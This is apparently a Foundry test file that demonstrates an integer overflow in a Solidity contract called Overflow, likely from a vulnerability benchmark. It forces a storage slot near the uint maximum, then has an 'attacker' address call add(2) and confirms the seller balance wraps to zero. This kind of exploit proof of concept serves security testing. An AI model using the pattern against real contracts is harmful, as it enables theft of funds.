// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_1.sol";

contract OverflowTest is Test {
    Overflow public overflowContract;
    address attacker = address(0x2);
    
    function setUp() public {
        overflowContract = new Overflow();
    }

    function testSellerBalanceOverflow() public {
        // Set initial sellerBalance to max uint - 1 using storage slot 0
        uint initialSellerBalance = type(uint).max - 1;
        vm.store(address(overflowContract), bytes32(uint256(0)), bytes32(initialSellerBalance));
        
        // Record initial attacker balance
        uint initialAttackerBalance = overflowContract.userBalances(attacker);

        console.log("--- BEFORE-Trigger State ---");
        console.log("Initial sellerBalance (slot0):", initialSellerBalance);
        console.log("Initial attacker balance:", initialAttackerBalance);

        console.log("--- Trigger: Call add(2) by attacker ---");
        // Perform attack - adding 2 causes overflow
        vm.prank(attacker);
        overflowContract.add(2);

        // Read final sellerBalance from storage slot 0
        uint finalSellerBalance = uint256(vm.load(address(overflowContract), bytes32(uint256(0))));
        uint finalAttackerBalance = overflowContract.userBalances(attacker);

        console.log("--- AFTER-Trigger State ---");
        console.log("Final sellerBalance (slot0):", finalSellerBalance);
        console.log("Final attacker balance:", finalAttackerBalance);

        // Check if the overflow occurred and attacker balance increased as expected
        if (finalSellerBalance == 0 && finalAttackerBalance == initialAttackerBalance + 2) {
            console.log("Vulnerability Exists: Successful overflow attack, seller balance reset to 0 and attacker balance increased by 2");
        } else {
            console.log("Vulnerability not Exist: Overflow condition not met or attacker balance did not increase as expected");
            revert();
        }
    }
}